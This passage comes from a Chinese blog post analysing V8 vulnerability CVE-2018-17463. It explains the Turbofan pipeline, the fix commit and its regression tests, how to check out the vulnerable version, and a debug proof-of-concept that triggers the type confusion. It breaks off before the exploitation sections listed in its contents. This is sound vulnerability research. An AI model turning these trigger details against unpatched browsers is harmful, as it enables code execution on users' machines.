<!DOCTYPE html>
<html class="has-navbar-fixed-top">
<head>
    <meta charset="utf-8">
<title>V8漏洞CVE-2018-17463分析与复现 - rr&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">








    <meta name="description" content="本文首发于先知。 最近在学习V8的compiler pipeline，CVE-2018-17463是一个很好的学习例子，该漏洞是由于V8在编译优化过程中消除检查节点造成的类型混淆错误，最终可造成任意代码执行。">
<meta property="og:type" content="article">
<meta property="og:title" content="V8漏洞CVE-2018-17463分析与复现">
<meta property="og:url" content="https://rycbar77.github.io/2023/12/01/V8%E6%BC%8F%E6%B4%9ECVE-2018-17463%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="rr&#39;s blog">
<meta property="og:description" content="本文首发于先知。 最近在学习V8的compiler pipeline，CVE-2018-17463是一个很好的学习例子，该漏洞是由于V8在编译优化过程中消除检查节点造成的类型混淆错误，最终可造成任意代码执行。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://rycbar77.github.io/2023/12/01/V8%E6%BC%8F%E6%B4%9ECVE-2018-17463%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/1.png">
<meta property="og:image" content="https://rycbar77.github.io/2023/12/01/V8%E6%BC%8F%E6%B4%9ECVE-2018-17463%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/2.png">
<meta property="og:image" content="https://rycbar77.github.io/2023/12/01/V8%E6%BC%8F%E6%B4%9ECVE-2018-17463%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/3.png">
<meta property="og:image" content="https://rycbar77.github.io/2023/12/01/V8%E6%BC%8F%E6%B4%9ECVE-2018-17463%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/4.png">
<meta property="article:published_time" content="2023-12-01T12:42:58.000Z">
<meta property="article:modified_time" content="2023-12-01T12:49:24.640Z">
<meta property="article:author" content="r4z77">
<meta property="article:tag" content="V8">
<meta property="article:tag" content="CVE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://rycbar77.github.io/2023/12/01/V8%E6%BC%8F%E6%B4%9ECVE-2018-17463%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/1.png">





<link rel="icon" href="rust.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">


<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">


<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">


<link rel="stylesheet" href="/css/style.css">


<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>


    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-128484503-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-128484503-1');
</script>


    


<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="rr's blog" type="application/atom+xml">
</head>
<body>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/">
                
                <img src="/images/logo.png" alt="" height="28">
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/archives">Archives</a>
            
            <a class="navbar-item "
               href="/categories">Categories</a>
            
            <a class="navbar-item "
               href="/tags">Tags</a>
            
            <a class="navbar-item "
               href="/links">Links</a>
            
            <a class="navbar-item "
               href="/about">About</a>
            
            <a class="navbar-item "
               href="/atom.xml">RSS</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            <a class="navbar-item search" title="Search" href="javascript:;">
                <i class="fas fa-search"></i>
            </a>
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    <i class="fa fa-list"></i>
                </a>
                <div class="navbar-dropdown is-right">
                    
                    
                    
                    
                    <a class="navbar-item" href="#Compiler-Pipeline简介">1&nbsp;&nbsp;<b>Compiler Pipeline简介</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#Ignition">1.1&nbsp;&nbsp;Ignition</a>
                    
                    
                    
                    <a class="navbar-item" href="#Sparkplug">1.2&nbsp;&nbsp;Sparkplug</a>
                    
                    
                    
                    <a class="navbar-item" href="#Turbofan">1.3&nbsp;&nbsp;Turbofan</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#漏洞信息">2&nbsp;&nbsp;<b>漏洞信息</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#漏洞分析">3&nbsp;&nbsp;<b>漏洞分析</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#漏洞利用">4&nbsp;&nbsp;<b>漏洞利用</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#Property-Overlapping">4.1&nbsp;&nbsp;Property Overlapping</a>
                    
                    
                    
                    <a class="navbar-item" href="#Addr-Of">4.2&nbsp;&nbsp;Addr Of</a>
                    
                    
                    
                    <a class="navbar-item" href="#Arbitrary-Write">4.3&nbsp;&nbsp;Arbitrary Write</a>
                    
                    
                    
                    <a class="navbar-item" href="#Get-Shell">4.4&nbsp;&nbsp;Get Shell</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#exp">5&nbsp;&nbsp;<b>exp</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#参考">6&nbsp;&nbsp;<b>参考</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" title="GitHub" target="_blank" rel="noopener" href="https://github.com/rycbar77">
                
                <i class="fab fa-github"></i>
                
            </a>
               
            
        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            V8漏洞CVE-2018-17463分析与复现
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            
                <time datetime="2023-12-01T12:42:58.000Z" itemprop="datePublished">Dec 1 2023</time>
            
        </span>
        
        
        <span class="column is-narrow">
            
            
            34 minutes read (About 5089 words)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <html><head></head><body><p>本文首发于<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13075">先知</a>。</p>
<p>最近在学习V8的compiler pipeline，CVE-2018-17463是一个很好的学习例子，该漏洞是由于V8在编译优化过程中消除检查节点造成的类型混淆错误，最终可造成任意代码执行。</p>
<span id="more"></span>

<h2 id="Compiler-Pipeline简介"><a href="#Compiler-Pipeline简介" class="headerlink" title="Compiler Pipeline简介"></a>Compiler Pipeline简介</h2><p>V8的整个compiler pipeline可以用下图表示，一段JS代码首先被转换成AST，然后在Ignition中解析并转换成V8的字节码，当字节码在执行JS函数的过程中，会收集profiling和feedback数据，这些信息会被Turbofan用来优化生成机器码。<br><img src="/2023/12/01/V8%E6%BC%8F%E6%B4%9ECVE-2018-17463%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/1.png"></p>
<h3 id="Ignition"><a href="#Ignition" class="headerlink" title="Ignition"></a>Ignition</h3><p>Ignition是V8引擎的解释器，这个阶段旨在快速启动执行JS代码，通过解释器直接执行字节码，它并不产生机器代码。它具有以下的功能和特点：</p>
<ul>
<li><strong>字节码生成：</strong> Ignition将JavaScript源代码解析为字节码，这是一种更加紧凑和机器友好的中间表示。字节码是一组高度优化的指令序列，更易于解释器执行。</li>
<li><strong>解释执行：</strong> Ignition的主要任务是解释执行字节码。通过直接执行字节码，Ignition能够快速启动JavaScript应用程序，而无需等待完整的编译过程。</li>
<li><strong>快速启动和执行：</strong> 为了提高启动速度，Ignition专注于快速执行，避免了一些传统解释器执行源代码时的性能瓶颈。这使得V8引擎能够在用户启动网页或执行简单命令时迅速响应。</li>
</ul>
<h3 id="Sparkplug"><a href="#Sparkplug" class="headerlink" title="Sparkplug"></a>Sparkplug</h3><p>在CVE-2018-17463这一版本中并没有这一阶段，Sparkplug是在V8 9.1版本中引入的非优化JS编译器，它位于Ignition和Turbofan之间，用于产生未经优化的机器码。<br>引入Sparkplug的原因非常简单，因为Ignition的性能达到了一个瓶颈，对于字节码的解释执行永远无法摆脱字节码解码等开销，而Turbofan的优化需要收集足够的运行时反馈信息，否则无法获取稳定的object shape，因此无法更早地进行优化。<br>Sparkplug具有以下的功能和特点：</p>
<ul>
<li><strong>快速编译：</strong> Sparkplug的设计目标之一是实现快速编译。它使用一些巧妙的技巧，如在字节码已经生成的基础上进行编译，避免了一些复杂的工作。</li>
<li><strong>直接生成机器码：</strong> Sparkplug直接在字节码上执行线性通道生成机器代码。这种方法减少了编译器的优化机会，但使得代码易于移植，而且由于后续流水线中有强大的优化编译器（TurboFan），这并不成问题。</li>
<li><strong>解释器兼容栈帧：</strong> 引入新编译器到已有的JS虚拟机中是一项艰巨的任务。为了解决这个问题，Sparkplug保持了“解释器兼容栈帧”，与Ignition解释器的栈帧结构基本一致，使得在整个系统中的集成变得简单。</li>
</ul>
<h3 id="Turbofan"><a href="#Turbofan" class="headerlink" title="Turbofan"></a>Turbofan</h3><p>Turbofan是V8引擎的最终优化编译器，负责将IR转换为高度优化的机器代码。在这个阶段，V8会根据程序的执行情况应用更复杂的优化策略，包括内联缓存、类型推断、循环优化等。Turbofan生成的机器代码是高度优化的，以提供最佳的性能。但是，由于优化的程度很高，在这一阶段很容易产生错误。CVE-2018-17463就是由于在优化过程中操作的side effect判断不正确，造成了类型混淆错误。</p>
<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>查看<a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/chromium/issues/detail?id=888923"># Issue&nbsp;888923</a>，我们可以看到该问题的初始修复补丁是通过提交<code>52a9e67a477bdb67ca893c25c145ef5191976220</code>推送的，提交信息为“[turbofan] Fix ObjectCreate’s side effect annotation.”。有了这个信息，可以使用<code>git show</code>命令来查看该commit修复了什么。</p>
<figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">commit <span class="hljs-number">52</span>a9e67a477bdb67ca893c25c145ef5191976220  </span><br><span class="line">Author: Jaroslav Sevcik &lt;jarin@chromium.org&gt;  </span><br><span class="line">Date: &nbsp;&nbsp;Wed Sep <span class="hljs-number">26</span> <span class="hljs-number">13</span>:<span class="hljs-number">23</span>:<span class="hljs-number">47</span> <span class="hljs-number">2018</span> +<span class="hljs-number">0200</span>  </span><br><span class="line">  </span><br><span class="line">&nbsp;&nbsp;&nbsp;[turbofan] Fix ObjectCreate<span class="hljs-number">'</span>s side effect annotation.  </span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;  </span><br><span class="line">&nbsp;&nbsp;&nbsp;Bug: chromium:<span class="hljs-number">888923</span>  </span><br><span class="line">&nbsp;&nbsp;&nbsp;Change-Id: Ifb22cd9b34f53de3cf6e47cd92f3c0abeb10ac79  </span><br><span class="line">&nbsp;&nbsp;&nbsp;Reviewed-on: https:<span class="hljs-comment">//chromium-review.googlesource.com/1245763  </span></span><br><span class="line">&nbsp;&nbsp;&nbsp;Reviewed-by: Benedikt Meurer &lt;bmeurer@chromium.org&gt;  </span><br><span class="line">&nbsp;&nbsp;&nbsp;Commit-Queue: Jaroslav Sevcik &lt;jarin@chromium.org&gt;  </span><br><span class="line">&nbsp;&nbsp;&nbsp;Cr-Commit-Position: refs/heads/master@{#<span class="hljs-number">56236</span>}  </span><br><span class="line">  </span><br><span class="line">diff --git a/src/compiler/js-<span class="hljs-keyword">operator</span>.cc b/src/compiler/js-<span class="hljs-keyword">operator</span>.cc  </span><br><span class="line">index <span class="hljs-number">94b</span>018c987d.<span class="hljs-number">.5</span>ed3f74e075 <span class="hljs-number">100644</span>  </span><br><span class="line">--- a/src/compiler/js-<span class="hljs-keyword">operator</span>.cc  </span><br><span class="line">+++ b/src/compiler/js-<span class="hljs-keyword">operator</span>.cc  </span><br><span class="line">@@ <span class="hljs-number">-622</span>,<span class="hljs-number">7</span> +<span class="hljs-number">622</span>,<span class="hljs-number">7</span> @@ <span class="hljs-function">CompareOperationHint <span class="hljs-title">CompareOperationHintOf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Operator* op)</span> </span>{  </span><br><span class="line">&nbsp;&nbsp;V(CreateKeyValueArray, Operator::kEliminatable, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\  </span><br><span class="line">&nbsp;&nbsp;V(CreatePromise, Operator::kEliminatable, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\  </span><br><span class="line">&nbsp;&nbsp;V(CreateTypedArray, Operator::kNoProperties, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\  </span><br><span class="line">- &nbsp;V(CreateObject, Operator::kNoWrite, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\  </span><br><span class="line">+ &nbsp;V(CreateObject, Operator::kNoProperties, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\  </span><br><span class="line">&nbsp;&nbsp;V(ObjectIsArray, Operator::kNoProperties, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\  </span><br><span class="line">&nbsp;&nbsp;V(HasProperty, Operator::kNoProperties, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\  </span><br><span class="line">&nbsp;&nbsp;V(HasInPrototypeChain, Operator::kNoProperties, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\  </span><br><span class="line">diff --git a/test/mjsunit/compiler/regress<span class="hljs-number">-888923.</span>js b/test/mjsunit/compiler/regress<span class="hljs-number">-888923.</span>js  </span><br><span class="line"><span class="hljs-keyword">new</span> file mode <span class="hljs-number">100644</span>  </span><br><span class="line">index <span class="hljs-number">00000000000.</span>.e352673b7d9  </span><br><span class="line">--- /dev/null  </span><br><span class="line">+++ b/test/mjsunit/compiler/regress<span class="hljs-number">-888923.</span>js  </span><br><span class="line">@@ <span class="hljs-number">-0</span>,<span class="hljs-number">0</span> +<span class="hljs-number">1</span>,<span class="hljs-number">31</span> @@  </span><br><span class="line">+<span class="hljs-comment">// Copyright 2018 the V8 project authors. All rights reserved.  </span></span><br><span class="line">+<span class="hljs-comment">// Use of this source code is governed by a BSD-style license that can be  </span></span><br><span class="line">+<span class="hljs-comment">// found in the LICENSE file.  </span></span><br><span class="line">+  </span><br><span class="line">+<span class="hljs-comment">// Flags: --allow-natives-syntax  </span></span><br><span class="line">+  </span><br><span class="line">+(function() {  </span><br><span class="line">+ &nbsp;function f(o) {  </span><br><span class="line">+ &nbsp;&nbsp;&nbsp;o.x;  </span><br><span class="line">+ &nbsp;&nbsp;&nbsp;Object.create(o);  </span><br><span class="line">+ &nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span> o.y.a;  </span><br><span class="line">+ &nbsp;}  </span><br><span class="line">+  </span><br><span class="line">+ &nbsp;f({ x : <span class="hljs-number">0</span>, y : { a : <span class="hljs-number">1</span> } });  </span><br><span class="line">+ &nbsp;f({ x : <span class="hljs-number">0</span>, y : { a : <span class="hljs-number">2</span> } });  </span><br><span class="line">+ &nbsp;%OptimizeFunctionOnNextCall(f);  </span><br><span class="line">+ &nbsp;assertEquals(<span class="hljs-number">3</span>, f({ x : <span class="hljs-number">0</span>, y : { a : <span class="hljs-number">3</span> } }));  </span><br><span class="line">+})();  </span><br><span class="line">+  </span><br><span class="line">+(function() {  </span><br><span class="line">+ &nbsp;function f(o) {  </span><br><span class="line">+ &nbsp;&nbsp;&nbsp;let a = o.y;  </span><br><span class="line">+ &nbsp;&nbsp;&nbsp;Object.create(o);  </span><br><span class="line">+ &nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span> o.x + a;  </span><br><span class="line">+ &nbsp;}  </span><br><span class="line">+  </span><br><span class="line">+ &nbsp;f({ x : <span class="hljs-number">42</span>, y : <span class="hljs-number">21</span> });  </span><br><span class="line">+ &nbsp;f({ x : <span class="hljs-number">42</span>, y : <span class="hljs-number">21</span> });  </span><br><span class="line">+ &nbsp;%OptimizeFunctionOnNextCall(f);  </span><br><span class="line">+ &nbsp;assertEquals(<span class="hljs-number">63</span>, f({ x : <span class="hljs-number">42</span>, y : <span class="hljs-number">21</span> }));  </span><br><span class="line">+})();</span><br></pre></td></tr></tbody></table></figure>

<p>可以大致了解这一漏洞为何产生，如何触发，这个放在后面去分析。首先需要将代码切换到未修复这一bug的版本，使用<code>git log 52a9e67a477bdb67ca893c25c145ef5191976220</code>查看commit信息。</p>
<figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">commit <span class="hljs-number">52</span>a9e67a477bdb67ca893c25c145ef5191976220  </span><br><span class="line">Author: Jaroslav Sevcik &lt;jarin@chromium.org&gt;  </span><br><span class="line">Date: &nbsp;&nbsp;Wed Sep <span class="hljs-number">26</span> <span class="hljs-number">13</span>:<span class="hljs-number">23</span>:<span class="hljs-number">47</span> <span class="hljs-number">2018</span> +<span class="hljs-number">0200</span>  </span><br><span class="line">  </span><br><span class="line">&nbsp;&nbsp;&nbsp;[turbofan] Fix ObjectCreate<span class="hljs-number">'</span>s side effect annotation.  </span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;  </span><br><span class="line">&nbsp;&nbsp;&nbsp;Bug: chromium:<span class="hljs-number">888923</span>  </span><br><span class="line">&nbsp;&nbsp;&nbsp;Change-Id: Ifb22cd9b34f53de3cf6e47cd92f3c0abeb10ac79  </span><br><span class="line">&nbsp;&nbsp;&nbsp;Reviewed-on: https:<span class="hljs-comment">//chromium-review.googlesource.com/1245763  </span></span><br><span class="line">&nbsp;&nbsp;&nbsp;Reviewed-by: Benedikt Meurer &lt;bmeurer@chromium.org&gt;  </span><br><span class="line">&nbsp;&nbsp;&nbsp;Commit-Queue: Jaroslav Sevcik &lt;jarin@chromium.org&gt;  </span><br><span class="line">&nbsp;&nbsp;&nbsp;Cr-Commit-Position: refs/heads/master@{#<span class="hljs-number">56236</span>}  </span><br><span class="line">  </span><br><span class="line">commit <span class="hljs-number">568979f</span>4d891bafec875fab20f608ff9392f4f29</span><br><span class="line">Author: Toon Verwaest &lt;verwaest@chromium.org&gt;  </span><br><span class="line">Date: &nbsp;&nbsp;Wed Sep <span class="hljs-number">26</span> <span class="hljs-number">12</span>:<span class="hljs-number">38</span>:<span class="hljs-number">28</span> <span class="hljs-number">2018</span> +<span class="hljs-number">0200</span>  </span><br><span class="line">  </span><br><span class="line">&nbsp;&nbsp;&nbsp;[parser] Fix memory accounting of explicitly cleared zones  </span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;  </span><br><span class="line">&nbsp;&nbsp;&nbsp;Bug: chromium:<span class="hljs-number">889086</span>  </span><br><span class="line">&nbsp;&nbsp;&nbsp;Change-Id: Ie5a6a9e27260545469ea62d35b9571c0524f0f92  </span><br><span class="line">&nbsp;&nbsp;&nbsp;Reviewed-on: https:<span class="hljs-comment">//chromium-review.googlesource.com/1245427  </span></span><br><span class="line">&nbsp;&nbsp;&nbsp;Reviewed-by: Marja Hölttä &lt;marja@chromium.org&gt;  </span><br><span class="line">&nbsp;&nbsp;&nbsp;Commit-Queue: Toon Verwaest &lt;verwaest@chromium.org&gt;  </span><br><span class="line">&nbsp;&nbsp;&nbsp;Cr-Commit-Position: refs/heads/master@{#<span class="hljs-number">56235</span>}</span><br></pre></td></tr></tbody></table></figure>

<p>可以看到包含这一漏洞的最后一个commit是<code>568979f4d891bafec875fab20f608ff9392f4f29</code>，使用<code>git checkout</code>命令切换到这一commit。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>通过仔细分析漏洞的patch，可以发现漏洞存在于<code>src/compiler/js-operator.cc</code>中。在这里，代码定义了许多标识，实际上只进行了一处修改，就是将<code>CreateObject</code>的标志从<code>kNoWrite</code>变成<code>kNoProperties</code>。</p>
<figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- &nbsp;V(CreateObject, Operator::kNoWrite, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\  </span><br><span class="line">+ &nbsp;V(CreateObject, Operator::kNoProperties, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\  </span><br></pre></td></tr></tbody></table></figure>

<p>这些标志位的定义在<code>src</code>中，是一个枚举类。</p>
<figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Property</span> {</span></span><br><span class="line">  kNoProperties = <span class="hljs-number">0</span>,</span><br><span class="line">  kCommutative = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">0</span>,  <span class="hljs-comment">// OP(a, b) == OP(b, a) for all inputs.</span></span><br><span class="line">  kAssociative = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">1</span>,  <span class="hljs-comment">// OP(a, OP(b,c)) == OP(OP(a,b), c) for all inputs.</span></span><br><span class="line">  kIdempotent = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">2</span>,   <span class="hljs-comment">// OP(a); OP(a) == OP(a).</span></span><br><span class="line">  kNoRead = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">3</span>,       <span class="hljs-comment">// Has no scheduling dependency on Effects</span></span><br><span class="line">  kNoWrite = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">4</span>,      <span class="hljs-comment">// Does not modify any Effects and thereby</span></span><br><span class="line">                          <span class="hljs-comment">// create new scheduling dependencies.</span></span><br><span class="line">  kNoThrow = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">5</span>,      <span class="hljs-comment">// Can never generate an exception.</span></span><br><span class="line">  kNoDeopt = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">6</span>,      <span class="hljs-comment">// Can never generate an eager deoptimization exit.</span></span><br><span class="line">  kFoldable = kNoRead | kNoWrite,</span><br><span class="line">  kKontrol = kNoDeopt | kFoldable | kNoThrow,</span><br><span class="line">  kEliminatable = kNoDeopt | kNoWrite | kNoThrow,</span><br><span class="line">  kPure = kNoDeopt | kNoRead | kNoWrite | kNoThrow | kIdempotent</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>

<p>可以看出<code>kNoWrite</code>表示一个操作并不产生任何side effects，很容易猜到，<code>CreateObject</code>应当是产生了一定的side effect。通过调试可以发现在<code>Map::CopyNormalized</code>函数中，使用<code>set_is_dictionary_map(true)</code>将新生成的map设定为<code>dictionary</code>模式。修改commit中给出的poc做一个调试和验证。</p>
<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params">o</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">let</span> a = o.y;</span><br><span class="line">  <span class="hljs-built_in">Object</span>.create(o);</span><br><span class="line">  <span class="hljs-keyword">return</span> o.x + a;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">x</span>: <span class="hljs-number">42</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">21</span>};</span><br><span class="line">%DebugPrint(obj);</span><br><span class="line">f(obj);</span><br><span class="line">%DebugPrint(obj);</span><br></pre></td></tr></tbody></table></figure>

<p>在执行f前后输出obj信息，执行输出结果如下。</p>
